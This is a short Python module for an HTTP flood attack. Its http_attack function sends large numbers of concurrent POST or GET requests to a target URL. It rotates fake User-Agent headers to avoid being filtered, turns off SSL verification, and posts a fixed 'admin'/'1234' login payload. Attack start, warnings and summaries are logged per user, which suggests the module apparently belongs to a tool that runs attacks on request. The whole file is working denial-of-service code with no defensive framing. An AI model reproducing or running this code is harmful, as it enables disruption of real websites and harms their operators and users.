import aiohttp
import asyncio
import random
from fake_useragent import UserAgent
from core.logger import attack_start, attack_summary, attack_warning

ua = UserAgent()

async def send_request(session, url, method="post", use_agent=True, attack_id=None):
    headers = {}
    if use_agent:
        headers["User-Agent"] = ua.random
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    try:
        if method == "post":
            payload = {"username": "admin", "password": "1234"}
            async with session.post(url, headers=headers, data=payload) as resp:
                return resp.status
        else:
            async with session.get(url, headers=headers) as resp:
                return resp.status
    except Exception as e:
        attack_warning(f"[ID-{attack_id}] Ошибка запроса ({method.upper()}): {url}")
        return None


async def http_attack(user_id, target_url, num_requests=100, concurrency=500, user_agent=True, method="post"):
    attack_id = random.randint(1000, 9999)
    attack_start(user_id, attack_id, "http", target_url, num_requests, concurrency=concurrency, agent=user_agent)

    success = 0
    connector = aiohttp.TCPConnector(ssl=False)
    start = asyncio.get_event_loop().time()

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(num_requests):
            tasks.append(send_request(session, target_url, method, user_agent, attack_id))
            if len(tasks) >= concurrency:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success += sum(1 for r in results if r == 200)
                tasks.clear()

        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            success += sum(1 for r in results if r == 200)

    duration = asyncio.get_event_loop().time() - start
    attack_summary(user_id, attack_id, "http", target_url, success, num_requests, duration)
    return success, num_requests
